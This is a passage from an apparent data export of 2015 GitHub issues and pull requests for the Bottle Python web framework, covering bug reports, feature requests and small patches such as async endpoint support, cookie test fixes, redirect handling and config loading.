DeprecationWarning: Warning: Use of deprecated feature or API. (Deprecated in Bottle-0.12)
Cause: Use of absolute path for template name.
Fix: Refer to templates with names or paths relative to the lookup path.
```

The bug is also visible with ""test_jinja2""
"
809,Implemented namespace support for merge,2015-12-08T23:23:05Z,2015-12-13T16:15:27Z,,,,
808,Fix to enable async based wsgi server to support yield and yield from in endpoints,2015-12-08T18:30:39Z,2016-02-12T11:21:53Z,,,,"The code in _cast that checks for the content type of iterable interferes with async based wsgi servers where the async endpoints are generators that yield or yield from while waiting for io.

``` python

# Handle Iterables. We peek into them to detect their inner type.
        try:
            iout = iter(out)
            first = next(iout)
            while not first:  # this interferes with async driven endpoints
                first = next(out)
```

Change to

``` python

# Handle Iterables. We peek into them to detect their inner type.
        try:
            iout = iter(out)
            first = next(iout)

```

The problem is that this code greedily consumes the iterable until there is non empty content. But it does not need to. An empty unicode string or an empty bytes will still suffice to determine the type.  There may be a use case for an iterable to return an empty string of a different type than what the non empty will be but that seems counter intuitive. The other cases where the itterable returns and HTTPResponse object I don't know about.

Type check still works in the event of an empty string but allows an endpoint to yield an empty string while its async waiting for async io to complete.

For example

``` python
@app.get('/register/<uid>')
def registerGet(uid):
        """"""
        Example of async endpoint
        """"""
       # must set content-type before first yield
        bottle.response.set_header('content-type', 'application/json')

        response = yield from myAsyncCoroutine()  # yields """" while not yet completed
        result = json.dumps(response)
        (yield result)

def myAsyncCoroutine():
     while True:
        # Async io here
        if done:
             break
        yield ''  # this is eventually yielded by wsgi app while waiting
     return response
```

I believe this is still compatible with PEP 3333 (see below)as start response has to keep iterating until it gets a
non empty return. This allows the WSGI server to drive the async endpoint coroutine by repeatedly calling the iterater. This allows very simple execution of async wsgi apps. The bottle.run is no longer necessary.

For example the following service routine is repeatedly called by an async scheduler running the the
wsgi http server:

``` python

def service(self):
        """"""
        Service application
        """"""
        if not self.closed and not self.ended:
            if self.iterator is None:  # initiate application
                self.iterator = iter(self.app(self.environ, self.start))

            try:
                msg = next(self.iterator)
            except StopIteration:
                self.write(b"""")  # if chunked write will send empty chunk to terminate
                self.ended = True
            else:
                if msg:
                    self.write(msg)
                    if self.length is not None and self.size >= self.length:
                        self.ended = True
```

where self.app in this case is a bottle app

With the changes I am able to get my async http server to support yield and yield from in the bottle endpoints where they yield empty strings while waiting for async io operations to complete before returning the response from the endpoint.

From PEP 3333
""However, the start_response callable must not actually transmit the response headers. Instead, it must store them for the server or gateway to transmit only after the first iteration of the application return value that yields a non-empty bytestring, or upon the application's first invocation of the write() callable. In other words, response headers must not be sent until there is actual body data available, or until the application's returned iterable is exhausted. (The only possible exception to this rule is if the response headers explicitly include a Content-Length of zero.)""
"
807,set_cookie inside a plugin for mounted applications,2015-12-01T10:58:43Z,,,,,"I have develop a plugin for manage session with mongodb and my project has few applications that I mount in the main module.

In main module I install the plugin and on every app I mount I set skip=()

The plug-in works good on every application, but the response.set_cookie inside the plugin does not affect to applications controllers. It only works in routes that are in the main module.

I have been trying different things for days but I can not get it work.

Please, could anybody help me?
"
806,Handle JSON requests with a vendor media type,2015-11-14T17:19:51Z,2016-02-12T10:34:54Z,"Needs input, Request, Undecided",,,"e.g. application/vnd.api+json
"
805,Add make command for running tests on py35,2015-11-14T17:11:27Z,2015-11-14T19:41:36Z,,,,
804,"added 'apps' as alias to app, defer 'default app' creation until requ…",2015-11-05T22:59:48Z,2016-02-12T10:07:17Z,,,,"…ired and add 'default' property to appstack

see https://groups.google.com/forum/#!topic/bottlepy/iMjGmPfJ0tE

This is very minor, tested, and has been discussed on the google group.  Hope all are happy for this.
I have more significant suggestions that can follow.
"
803,Typo fix on bottle-werkzeug README,2015-11-04T13:19:17Z,2016-02-12T09:57:15Z,,,,"the document of `bottle-werkzeug` is a little confused.
"
802,We must save the file first as a static-file before download it in bottle?,2015-11-04T08:57:05Z,2015-11-05T03:56:57Z,,,,"i've notice the manual:

```
@route('/download/<filename:path>')
def download(filename):
    return static_file(filename, root='/path/to/static/files', download=filename)
```

what can i do to put it into the response's stream without save it.
"
801,parent death signal with reloader=True,2015-10-29T16:45:52Z,,,,,"I have a bottle project where the process loads a lot of data. With reloader=True, typing ^C on the bottle process means the memory-heavy child remains alive. And it's holding the port open.

In Linux, this is easy to deal with by using a parent death signal:

```
libc = ctypes.CDLL(""libc.so.6"")
# PR_SET_PDEATHSIG = 1
libc.prctl(1, signal.SIGTERM)
```

That's not very pretty code, sorry, but I think that this would be a good default behavior under Linux.
"
800,adding new features?,2015-10-25T23:18:41Z,,,,,"We are using bottle for a few projects,  and would love to add some new features.

The focus would be to ensure nothing breaks back compatibility and existing apps would run with the new features.

I have a fork, and can make suggested changes to that fork, so that it is possible features could be adopted by the bottle project.  Of course, this depends on how open the bottle project is to new ideas.  Perhaps the idea is to freeze features?   Or there is already a major revision in the works so the timing is bad?

How open is bottle to new features?  What is the best way to have debate on ideas?
"
799,Request.msgpack property,2015-10-20T16:36:14Z,2016-08-27T15:14:13Z,,,,"Hi, I'm working with Bottle and a MsgPack API and I want to share my implementation of MsgPack bodyparser.
"
798,Request.msgpack property,2015-10-20T15:59:33Z,2015-10-20T16:09:03Z,,,,"Hi, I'm working with Bottle and a MsgPack API and I want to share my implementation of MsgPack bodyparser.
"
797,Merge pull request #2 from defnull/master,2015-10-20T13:58:40Z,2015-10-20T14:02:36Z,,,,"Update from original
"
796,Fix minor error in getargspec,2015-10-11T17:55:23Z,2015-10-11T18:19:45Z,,,,"A followup to #794.

From the documentation:

> defaults is a tuple of default argument values or None if there are no default arguments

so `return (args, varargs, keywords, tuple(defaults) or defaults)` should be `return (args, varargs, keywords, tuple(defaults) or None)`.

Sorry for this.
"
795,Fix cookie tests in test_environ.TestResponse,2015-10-11T10:39:43Z,2015-10-11T17:08:07Z,,,,"This is a solution for #791.

A few tests are failing because of [some recent changes](http://bugs.python.org/issue23250) in `http.cookies`:
- `test_set_cookie_secure`
- `test_set_cookie_httponly`

`test_delete_cookie` fails too, I'm not entirely sure why. The workaround is to check for containment of `'Max-Age=-1'`.

Also, I added Python 3.5 to `.travis.yml`.
"
794,cannot import name 'getargspec' in Python 3.6(-dev),2015-10-11T07:23:32Z,2015-10-11T17:11:52Z,,ImportError,ImportError: cannot import name 'getargspec',"[`inspect.getargspec`](https://docs.python.org/3/library/inspect.html#inspect.getargspec) has been removed

> Deprecated since version 3.0: Use signature() and Signature Object, which provide a better introspecting API for callables. This function will be removed in Python 3.6.

bottle.py fails with the following error:

```
Traceback (most recent call last):
  File ""<file>"", line 77, in <module>
    from inspect import getargspec
ImportError: cannot import name 'getargspec'
```
"
793,Unable to mount to path containing variable,2015-10-09T22:30:41Z,,,TypeError,TypeError: mountpoint_wrapper() takes no arguments (1 given),"I'd like to mount an app to a path containing a variable. For example, if I mounted `app` to `/lol/<x>`, I'd like all callbacks sent to `app.get` to receive an argument `x`. I tried:

``` python
import bottle

app = bottle.Bottle()
bottle.mount('/lol/<x>', app)

@app.get('/')
def index(x):
    return x

bottle.run()
```

which unfortunately produced:

```
Traceback (most recent call last):
  File ""/usr/local/lib/python2.7/site-packages/bottle.py"", line 862, in _handle
    return route.call(**args)
TypeError: mountpoint_wrapper() takes no arguments (1 given)
```

This is actually a common requirement, e.g. in mounting a `user` app to `/users/<user_id>` to handle API endpoints pertaining to a specific user. Is this possible?
"
792,redirect() and non-ascii characters,2015-10-03T16:41:21Z,,,"Exception, UnicodeEncodeError","Exception:, UnicodeEncodeError: 'ascii' codec can't encode characters in position 32-37: ordinal not in range(128)","Redirect to url with non-ascii characters causes an error:

Exception:

```
UnicodeEncodeError('ascii', u'http://localhost:9891/?status=1 \u044f\u043d\u0432\u0430\u0440\u044f', 32, 38, 'ordinal not in range(128)')
```

Traceback:

```
Traceback (most recent call last):
  File ""C:\Users\user\Documents\Bitbucket\lab\bottle.py"", line 862, in _handle
    return route.call(**args)
  File ""C:\Users\user\Documents\Bitbucket\lab\bottle.py"", line 1732, in wrapper
    rv = callback(*a, **ka)
  File ""C:\Users\user\Documents\Bitbucket\lab\main.py"", line 160, in register
    redirect(u'/?status=1 января') # temp
  File ""C:\Users\user\Documents\Bitbucket\lab\bottle.py"", line 2421, in redirect
    res.set_header('Location', urljoin(request.url, url))
  File ""C:\Users\user\Documents\Bitbucket\lab\bottle.py"", line 1539, in set_header
    self._headers[_hkey(name)] = [str(value)]
UnicodeEncodeError: 'ascii' codec can't encode characters in position 32-37: ordinal not in range(128)
```
"
791,test_delete_cookie fails with Python 3.5,2015-09-20T01:47:42Z,,,AssertionError,AssertionError: False is not true,"Hi, I am getting the following test error when running against Python 3.5:

```
======================================================================
FAIL: test_delete_cookie (test_environ.TestResponse)
----------------------------------------------------------------------
Traceback (most recent call last):
  File ""/build/python-bottle/src/bottle/test/test_environ.py"", line 614, in test_delete_cookie
    self.assertTrue('name=;' in cookies[0])
AssertionError: False is not true

----------------------------------------------------------------------
```

With Python 3.4 and all other components at the same version, it passes.
"
790,FR: Dissection of Accept header,2015-09-17T13:44:26Z,2016-01-22T19:07:57Z,,,,"Currently the only way to inspect the Accept header is to manually apply string splitting, for example;

``` py
found = []
lines = request.headers.getall('Accept', [])
for line in lines:
    found += line.split("","")
```

It would be nice if bottle had support for this out of the box, perhaps something like;

```
request.accept_content_type = ['application/json', 'text/html']
```

Admittedly the naming convention of `accept_content_type` is a bit crappy, so I'd welcome other suggestions.

Thoughts?
"
789,Testing Bottle application using webtest,2015-09-17T12:24:57Z,2015-11-13T06:56:01Z,,AppError,AppError: Bad response: 404 Not Found (not 200 OK or 3xx redirect for http://localhost/login),"I tried to `unittest` a Bottle application with the webtest python suite. Based on the example provided in the doc, I built my own test module but I do not succeed in testing because I always get an 404 error on any page I try to request ...

Should you provide a working example of such testings ?

I copy my example: 

```
import os
import unittest

# for HTTP tests
from webtest import TestApp

from nose import with_setup # optional
from nose.tools import *

import bottle
from bottle import Bottle

class Server(Bottle):
    def __init__(self, host, port):
        Bottle.__init__(self)
        self._host = host
        self._port = port

    def set_routes(self):
        bottle.route(""/"")(self.index)
        bottle.route(""/login"", method=""GET"")(self.login_form)
        bottle.route(""/login"", method=""POST"")(self.login)
        bottle.route(""/logout"")(self.logout)

    def start(self):
        self._app.run(host=self._host, port=self._port)

    def index(self):
        return template('Hello {{name}}, how are you?', name='Guest')

    def login(self):
        username = bottle.request.POST.get('username', '').strip()
        password = bottle.request.POST.get('password', '').strip()
        bottle.redirect(""/"")

    def login_form(self):
        return 'Login form'

    def logout(self):
        return 'Bye'

server = Server(host='localhost', port=80)
server.set_routes()
# server.start()

# extend the class unittest.TestCase
class test_app(unittest.TestCase):
    def test_functional_login_logout(self):
        app = TestApp(server)

        app.post('/login', {'user': 'foo', 'pass': 'bar'}) # log in and get a cookie

        assert app.get('/admin').status == '200 OK'        # fetch a page successfully

        app.get('/logout')                                 # log out
        app.reset()                                        # drop the cookie

        # fetch the same page, unsuccessfully
        assert app.get('/admin').status == '401 Unauthorized'        
```

And the output of nosetests: 

```
$ nosetests -v -s test_bottle.py
test_functional_login_logout (test_bottle.test_app) ... ERROR

======================================================================
ERROR: test_functional_login_logout (test_bottle.test_app)
----------------------------------------------------------------------
Traceback (most recent call last):
  File ""/home/shinken/alignak-webui/test/test_bottle.py"", line 73, in test_functional_login_logout
    app.post('/login', {'user': 'foo', 'pass': 'bar'}) # log in and get a cookie
  File ""/usr/local/lib/python2.7/dist-packages/webtest/app.py"", line 370, in post
    content_type=content_type)
  File ""/usr/local/lib/python2.7/dist-packages/webtest/app.py"", line 735, in _gen_request
    expect_errors=expect_errors)
  File ""/usr/local/lib/python2.7/dist-packages/webtest/app.py"", line 631, in do_request
    self._check_status(status, res)
  File ""/usr/local/lib/python2.7/dist-packages/webtest/app.py"", line 663, in _check_status
    res)
AppError: Bad response: 404 Not Found (not 200 OK or 3xx redirect for http://localhost/login)

    <!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN"">
    <html>
        <head>
            <title>Error: 404 Not Found</title>
            <style type=""text/css"">
              html {background-color: #eee; font-family: sans;}
              body {background-color: #fff; border: 1px solid #ddd;
                    padding: 15px; margin: 15px;}
              pre {background-color: #eee; border: 1px solid #ddd; padding: 5px;}
            </style>
        </head>
        <body>
            <h1>Error: 404 Not Found</h1>
            <p>Sorry, the requested URL <tt>&#039;http://localhost:80/login&#039;</tt>
               caused an error:</p>
            <pre>Not found: &#039;/login&#039;</pre>
        </body>
    </html>


----------------------------------------------------------------------
Ran 1 test in 0.005s

FAILED (errors=1)
```
"
788,Why is bottle not listed in github explore list for web frameworks.,2015-09-15T14:42:28Z,,,,,"I was browsing through github explore list at https://github.com/showcases/web-application-frameworks and could not find bottle there. Projects having less stars and forks than bottle are listed there but not bottle. Why so?
I filed it here because it is pretty important and limits exposure of bottle to a more wider audience.
"
787,Fixes #772,2015-09-11T12:49:06Z,2015-10-11T18:31:14Z,,,,"Fixes #772, Includes tests, passed.
"
786,Add pathlib support to static_file,2015-09-09T09:20:06Z,,,,,"The `static_file` function does not currently work with `pathlib.Path` objects. Adding this would save clutter caused by string casts.
"
785,Add test case for 'load_config',2015-09-07T09:21:49Z,2016-08-27T16:50:30Z,,,,"#784
"
784,[Bug] ConfigDict.load_config.  'DEFAULT' section not work properly.,2015-09-07T09:20:15Z,2016-08-27T16:49:23Z,,,,"When load config file 

```
[DEFAULT]
interval = 45

[bottle]
port = 8080

[compression]
status = single
```

We incorrectly set  'compression.interval' 

**REASON**
https://github.com/bottlepy/bottle/blob/534a2e08ac0ef55dd542a3a83b1118188c6a399b/bottle.py#L2188-L2192 
_conf.sections_ won't return _DEFAULT_ section
_conf.items_ will return _DEFAULT_ options as well.
"
783,make load_app() work on modules in cwd when bottle is called via a script,2015-09-02T21:57:30Z,2015-10-11T18:43:34Z,,ImportError,ImportError: No module named my_app,"For example, if you call a python script that launches
bottle, it is the path of the script that gets added
to `sys.path`, _not_ the current directory. But it is
with respect to the current directory that I would like
to specify the value for `app`:

https://github.com/bottlepy/bottle/blob/0.12.8/bottle.py#L3044-L3045

This makes it so that the application/target can be found,
if it is in the current directory, even if you are
calling another script somewhere else that ultimately
hands over to bottle, and thus the `load_app()` function

The error avoided is:

``` python
ImportError: No module named my_app
```

When I execute a script that passes the value `""my_app""`
to `bottle.run(app=value)`
"
782,"Add a way to get nested dicts out of a ConfigDict for libraries that need them (e.g. logging.config, beaker)",2015-08-21T18:15:30Z,,Accepted,,,"@rcarmo said in #772

> May I suggest ensuring that the Python logging configuration becomes part of the overall config?

The bottle config is flat (i.e. `keys.with.dots.in.them`) but the `logging.config` module expects a nested structure. Some other frameworks need that, too (e.g. beaker). We have `ConfigDict.load_dict()` to flatten a nested dictionary or json. The reverse would be required to easily populate logging configuration out of bottle.
"
781,Add JSON pretty printing support,2015-08-17T16:55:37Z,2015-10-11T18:50:10Z,,,,"Added pretty printing support for JSON responses. This is mainly useful for development, to make it easier to read JSON responses.

The default is to not use pretty printing. But pretty printing can be enabled via:

```
app = Bottle(autojsonpretty=True)
```
"
780,make requires Python 2.5,2015-08-16T06:52:58Z,2015-08-17T19:27:24Z,,,,"Running make failt w/ the following:

python2.5 test/testall.py
make: python2.5: Kommando nicht gefunden
make: **\* [test_25] Fehler 127
#### 

Maybe not hard-code the Python version?
"
779,foother.tpl -> footer.tpl,2015-08-02T02:11:37Z,2015-08-03T21:02:35Z,,,,
778,Return 400 with bad json request,2015-07-31T03:31:44Z,2015-10-11T18:52:46Z,,,,"JSON requests should not return a 500 error as the issue is with
the requester's json and not the server itself. Fixes #654
"
777,Fix #720 : Allow unicode keys in ConfigDict.,2015-07-24T09:59:22Z,2015-07-25T11:39:42Z,,,,
776,Fix #720 : Allow unicode keys in ConfigDict.,2015-07-24T09:58:47Z,2015-07-25T11:38:40Z,,,,
775,Test of cookie name and value length,2015-07-19T11:53:48Z,2015-10-11T19:00:05Z,,,,"Added 2 tests of max cookie name and length.
"
774,Formsdict attribute like access returns invalid values for parameters submitted with unicode characters,2015-07-13T09:16:53Z,,Needs input,,,"Suppose we got a parameter submitted which has the value of 'ğüşiöç': `aparam = 'ğüşiöç'`

If request.method is 'GET':

`request.GET.aparam returns : 'ğüşiöç'` --> ok
`request.GET['aparam'] returns : 'ÄÃ¼ÅiÃ¶Ã§'`--> ??

If request method is 'POST':

`request.POST.aparam returns : ''` --> ??
`request.POST['aparam'] returns : 'ğüşiöç`--> ok

This behaviour interrupts clean and consistent coding style. When I need to access request form parameters I need to remember correct way to access them rather than simply writing request.POST.aparam.

Is this behaaviour is intended way or is this a bug or am I missing sth?

PS: Tested with Python 3.4, Python 3.2, and latest bottle github clone code

TIA
"
773,json for 'application/json-rpc',2015-07-08T15:24:23Z,2016-02-12T10:36:31Z,,,,"Added json property for requests with 'application/json-rpc' content-type (#769)
"
772,Ability to load config from module,2015-07-06T14:07:17Z,2016-08-30T20:57:14Z,Accepted,,,"Currently it is not possible to load config from a Python module (similar to the way Django does it).

I'd like to propose the following;

``` py
class ConfigDict(dict):
    def load_module(self, module_path):
        """"""
        Load configuration from module path

        >>> load_module('settings.prod')
        """"""
        assert isinstance(module_path, str)
        config = importlib.import_module(module_path)
        obj = {key: getattr(config, key) for key in dir(config) if key.isupper()}
        self.update(obj)
```

Happy to put together a tested PR if this proposal is accepted
"
771,i should use request.url to distinguish whether the request comes from localhost. right?,2015-07-02T14:20:02Z,2015-07-05T11:48:50Z,,,,"i will run the server for both local and remote user. i distinguish the request's source as below.

if request.url.find( 'http://localhost:' ) == 0:
   pass
else:
   pass

is it the best way?  thanks.
"
770,DeprecationWarning: Switch to Plugin API v2,2015-07-02T07:09:42Z,2015-07-09T06:48:30Z,,,,"I am using bottle v0.12.8 with bottle-sqlite and whenever I start the server I get a warrning:

/usr/local/lib/python2.7/dist-packages/bottle.py:527: DeprecationWarning: Switch to Plugin API v2 and access the Route object directly.
context = self if api > 1 else self._context
"
769,Add json property for 'application/json-rpc' requests,2015-06-29T17:20:34Z,2016-08-31T11:08:16Z,Needs input,,,"Don't know if there are any pitfalls, but seems to be trivial:
`if ctype in ['application/json', 'application/json-rpc']:`
instead of
`if ctype == 'application/json':`
"
768,request.forms.get with multiple select fields,2015-06-24T09:40:36Z,2015-06-24T10:10:55Z,,,,"Hi,

If I use request.forms.get('accions') and and foo is a select with multiple options:

```
        <select multiple id=""input-accions"" name=""accions"">
         % for accio in accions:
           <option value=""${accio}"">${accio}</option>
         % endfor
         </select>
```

then I just receive the last one. How can I get the whole set?
"
767,Added `code` argument to static_file,2015-06-19T06:35:59Z,2015-06-28T13:09:47Z,,,,"Sometimes I use `static_file` to return something I've created during a `POST`. There the `201` response code makes more sense.
"
766,Fix minor typo,2015-06-19T05:25:50Z,2015-07-05T11:38:38Z,,,,
765,Allow passing options to eventlet server,2015-06-18T18:33:42Z,,,,,"Looking at the code for `EventletServer`, the options dict is not used to pass options to it's `server` function, as is done in some other servers like `GeventServer`.  

In order to get SeverSentEvents (sse) to work under bottle with eventlet, `minimum_chunk_size=1` needs to be passed to `server`.

Here is a gist of an example I'm trying to get to work: https://gist.github.com/bj0/89ceb572dd26a883c5f2
Here is a bug report on eventlet: https://github.com/eventlet/eventlet/issues/236
"
764,Docs use new param syntax for route func.,2015-06-11T12:58:40Z,2015-06-16T17:18:09Z,,,,
763,Naming convention inconsistency,2015-06-08T13:54:25Z,2015-06-08T14:02:53Z,,,,"HTTP response codes are referenced as both `status` and `code` throughout the code, which gives the feeling of naming inconsistency. 

One particular example would be `HTTPError`, this class uses `code` where as it's immediate parent `HTTPResponse` uses `status` instead. Although this would result in a backwards incompatible change, it would be nice to see this naming cleaned up on the next major release.

Thoughts?
"
762,Why we use a copy of `cls.settings` in bottle,2015-06-07T09:32:17Z,2015-06-12T01:50:58Z,,,,"What is the purpose of `cls.settings = cls.settings.copy()` in [bottle.py](https://github.com/bottlepy/bottle/blob/master/bottle.py#L3367).
"
761,Proposal for request global removal,2015-06-05T16:50:39Z,,"Needs Documentation, Needs input, Needs test, Request",,,"Currently the request context is stored in the `request` global, which can encourage anti patterns such as accessing the request object from a database model. 

I'm thinking that a cleaner approach would be to pass in the `request` context to the view function itself, rather than having to access it from a global. This object would then be passed around as/where it was needed, encouraging modularity by design.

``` py
def some_view(request):
    print request
```

Could a core maintainer give their thoughts?
"
760,load_dict only accepts nested dict,2015-06-04T20:11:22Z,2015-06-04T21:37:28Z,,,,"Currently, `ConfigDict.load_dict` will only support a nested dict. However, there are some situations where you do not want to load the config as a nested dict, for example if you have `logging.config.DictConfig` values in the same dict. It would be nice if bottle supported the ability to load a dict without attempting to nest it. Thoughts?
"
759,Thank you,2015-06-04T19:25:43Z,2015-08-17T20:06:01Z,,,,"No problem here, just a little note to thank all the maintainers for their love and hard work that has gone into this project. It has saved me a lot of time, and I can only thank you for sharing this with us all.
"
758,Remove validate decorator related documentation,2015-05-29T19:14:31Z,2015-06-17T18:30:18Z,,,,"Fixes issue #705 

Signed-off-by: Aayush Kasurde aayush.kasurde@gmail.com
"
757,Strange behavior when calling into self.,2015-05-18T09:25:11Z,,,,,"Recently i encounter a strange behavior, i'm not sure if it's normal. 
The following programs are made only to demonstrate the issue, the real world application is more complex.

``` python
from bottle import route, app
import urllib2

@route('/a')
def a():
    return 'a'

@route('/b')
def b():
    urllib2.urlopen('http://localhost:10001/a')
    return 'SUCCESS'

if __name__ == '__main__':
    from wsgiref.simple_server import make_server
    make_server('127.0.0.1', 10001, app()).serve_forever()
```

```
$ curl http://localhost:10001/b
```

This request would block indefinitely.
And if i use gevent, it won't block, but it shows some even more strange behavior.

``` python
from gevent import monkey
monkey.patch_all()

from bottle import route, app
import urllib2

@route('/a')
def a():
    return 'a'

@route('/b')
def b():
    urllib2.urlopen('http://localhost:10001/a')
    return 'SUCCESS'

if __name__ == '__main__':
    from gevent.pywsgi import WSGIServer
    WSGIServer(('127.0.0.1', 10001), app()).serve_forever()
```

```
$ curl http://localhost:10001/b
S
```

Currently, i sidestep this issue by spawn a thread to execute the http request.
"
756,prevent run() function pass argument parser object to gunicorn server,2015-05-04T20:36:02Z,,,"Error, NOTE","Error: environment setting 'production' invalid, NOTE: I don't want to change --env option to some other thing","I have an argument parser that have an `--env, -e` option which is different from gunicorn's `--env, -e`. When I call run with the following parameters;

``` python
kwargs = { 'workers': 4 }
bottle.run(app.wsgi,
           host='localhost',
           port=8080,
           debug=False,
           reloader=False,
           server='gunicorn',
           **kwargs)
```

The `run()` function sends gunicorn to my previously created ArgumentParser object unexpectedly and gives the following error;

```
Error: environment setting 'production' invalid
```

This error is coming from gunicorn's config module;
https://github.com/benoitc/gunicorn/blob/master/gunicorn/config.py#L187
How can I solve this problem?
NOTE: I don't want to change --env option to some other thing
"
755,Link bottle logo to bottlepy.org,2015-04-29T03:30:55Z,2015-06-18T10:12:14Z,,,,
754,Newer versions of apache use a slightly different configuration,2015-04-26T05:58:53Z,2015-06-18T10:12:40Z,,,,"The current example of apache virtual server does not work with Apache 2.4. I added an example that works with that version.
"
753,all_errors wrapper,2015-04-24T09:28:37Z,,,,,"Feature to cach all errors in one function.
Allow to avoid error(400) error(401) ... declarations.

Normally achived by : 

```
def f(*a):
  # code here 
bottle.Bottle.default_error_handler = f
```
"
752,ThreadingMixIn for the development server? ,2015-04-23T20:06:10Z,,,,,"After reading this: http://ychaouche.wikispot.org/HowBottleAppsWork

Pro: You don't run into the one-request wall while developing long polling stuff.
Con: You run into the wall later because you think everything works with the default server.

Thoughts?
"
751,Broken output filter reference in tutorial,2015-04-10T18:24:49Z,,,,,"In http://bottlepy.org/docs/dev/tutorial.html#generating-content (Dictionaries) there's a broken reference to a tutorial that does not seem to exist.

> See the _tutorial-output-filter_ to learn more.

I was hoping to find how to extend json serialization to handle datetime instances, but alas…
"
750,Silently exits on suspend/resume,2015-04-04T21:11:08Z,,,,,"I'm running bottle 0.12.8 on a laptop with `run(reloader=True, debug=True)` and from what I can tell every time after the laptop resumes from sleep the bottle server has silently exited.

I can't think of a good reason to exit because of suspend/resume, but if it must then some explanatory error message and/or exit code would be in order IMO.
"
749,Relative rediects per RFC7231 as the new default,2015-04-02T17:09:15Z,,Needs input,,,"In #747 @polymorphm pojnted out that according to RFC7231 (which obsoletes RFC2616) relative URLs in the _Location_ header are allowed.

**Current behavior:** Bottle tries to turn relative URLs in `bottle.redirect()` calls into absolute URLs by joining with the `request.url` string. See https://github.com/bottlepy/bottle/blob/master/bottle.py#L2445

**New behavior:** Bottle just passes the provided URI as is. No URL-joining will be performed.

This behavior change _should_ have no effect on well behaved clients. Relative URLs in `Location` headers are supported by all client libraries I know of because it is a common (previously non-standard but now allowed) practice for years now.

It is still a behavior change with no obvious upgrade path. This is why I opened this issue. If you can think of a situation where this change breaks an existing application, or introduce a security risk, please speak up.
"
748,``redirect(...)`` must use relative url path (NOT absolute url path),2015-04-02T01:02:51Z,,,,,"good day! :-)

function `redirect(...)` must use relative url path (NOT absolute url path).

server backend -- in some cases -- do not knows about REAL absolute url path.

example if we will use HTTP-header `Alt-Svc: ...`. or in some other cases

I writed pull request -- https://github.com/bottlepy/bottle/pull/747
"
747,Redirect bugfix,2015-04-02T01:02:38Z,,,,,"tiny but important fix:

```
diff --git a/bottle.py b/bottle.py
index 535ddd3..359ceaf 100644
--- a/bottle.py
+++ b/bottle.py
@@ -2418,7 +2418,7 @@ def redirect(url, code=None):
     res = response.copy(cls=HTTPResponse)
     res.status = code
     res.body = """"
-    res.set_header('Location', urljoin(request.url, url))
+    res.set_header('Location', url)
     raise res
```
"
746,Add import os to app.wsgi example,2015-03-31T20:05:19Z,2015-04-01T17:24:48Z,,,,"The current version of app.wsgi example fails
"
745,Do you have the document for Bottle of early version?,2015-03-30T06:03:53Z,2015-06-05T21:00:37Z,,,,"Hi,
I am a novice programmer of Python Web from China.I want to develop a web framework of myself.Now,I want to learn from bottle.However,I find Bottle 0.12 a little complicated,and the Bottle 0.4.3 have only about 700 lines,so ,I want to learn from it know.Do you have the document for Bottle of early version?0.4 or any other early version?Please e-mail them to me.What'more,I can only read English document.

Thanks.
"
744,Removed unnecessary `and func is not None` check.,2015-03-24T16:16:33Z,2015-03-24T16:50:15Z,,,,"I couldn't find the case, where func is `None`.

See #740 for details.
"
743,send notification on crash build to IRC #bottlepy,2015-03-24T13:59:21Z,2015-03-24T14:10:40Z,,,,"notify when the crash build
"
742,"bottle-boilerplate, structure (MVC) for anyone who wants to use bottle",2015-03-24T13:41:51Z,2015-11-28T19:58:03Z,,,,"**Is not a rule to follow, just that you would like to be able to use!**

For those who begin to use Bottle gets lost with the total freedom that the framework of, that's great for software architect. On the other hand we have problem with developers who don't want to take decision of software architecture, so I started the project bottle-boilerplate[1].

What do you think of migrating the repository into the organisation of the bottle? And be maintained as a project officer in the Bottle?

If so, it would be important to migrate the repository for the Organization of the bottle (do not create a blank repository).

[1] https://github.com/avelino/bottle-boilerplate
"
741,Don't berate users about their lack of domain-specific knowledge.,2015-03-23T20:08:40Z,2015-03-24T12:58:41Z,,,,"It's [pretty discouraging](http://adamonishi.com/2015/02/obviously-language-in-education/) to be told you should have known something you don't know.
"
740,.get_undecorated_callback() bugfix,2015-03-23T12:56:14Z,2015-03-24T12:53:54Z,,,,"Continuation of #739.

I've cleaned the code and added working test example of conditions, which triggers the bug. The bug is probably caused by inspect module being confused by modification of `kwargs`. Here is example from tests, which can trigger the bug:

``` python
def test_callback_inspection_multiple_args(self):
    # decorator with argument, modifying kwargs
    def d2(f=""1""):
        def d(fn):
            def w(*args, **kwargs):
                # modification of kwargs WITH the decorator argument
                # is necessary requirement for the error
                kwargs[""a""] = f
                return fn(*args, **kwargs)
            return w
        return d

    @d2(f='foo')
    def x(a, b):
        return

    route = bottle.Route(None, None, None, x)

    # triggers the ""TypeError: 'foo' is not a Python function""
    self.assertEqual(set(route.get_callback_args()), set(['a', 'b']))
```

The bugfix just goes over all parameters and looks for one which looks like function. That is different from current code, which just takes first parameter and hopes, that it is function.
"
739,.get_undecorated_callback() bugfix,2015-03-22T15:04:43Z,2015-03-23T10:45:12Z,,,,"I've found obscure error triggered in case of decorators with multiple parameters.

Now, the `.get_undecorated_callback()` method just picks first attribute, which doesn't have to be function, but also one of the parameters of decorator with multiple parameters.

For example, this decorator will trigger the bug:

``` python
def database_decorator(fn=None, filename=""default.sqlite"", table=""default""):
    """"""
    Open connection to the database and offer it to the wrapped function.

    So far, there is no database, only primitive JSON load/store system.
    """"""
    def database_decorator_wrapper(fn):
        @wraps(fn)
        def database_wrapper(*args, **kwargs):
            path = filename
            if not os.path.isabs(path):
                path = os.path.join(settings.DATABASE_PATH, path)

            # load database
            db = SqliteDict(
                path,
                # autocommit=True
            )

            # load table
            table_ref = db.get(table, {})

            # put table to function parameters
            kwargs[""db""] = table_ref

            out = fn(*args, **kwargs)

            # save database
            db[table] = table_ref
            db.commit()

            return out

        return database_wrapper

    if fn:  # python decorator with optional parameters bukkake
        return database_decorator_wrapper(fn)

    return database_decorator_wrapper
```

My patch just looks for cases when the `func` is not `FunctionType` instance (which it should be) and then goes thru all the parameters and pick first `FunctionType` instance.
"
738,redirect issues behind ssl reverse proxy,2015-03-19T14:14:29Z,2015-04-02T13:49:29Z,,,,"While running a simple bottle test app behind a pound proxy on a non-standard port I am seeing an issue with redirects relocating the url from https to http. 

Issue:
Calling curl against **https**://192.168.0.250:18443/testredirect results in a redirect to **http**://192.168.0.250:18443/test .

This issue only occurs on a non-standard port. If I run the service on 443 everything works.

I found a way to fix the issues for cherrypy:
http://turbogears.org/1.0/docs/Install/RedirectHttpsRequests.html

Is there a way to do the same with bottle? 

Snippet:

``` @route('/testredirect')
def testredirect():
    bottle.redirect('/test')

bottle.run(port=18080, app=app)
```

Curl Details:

```
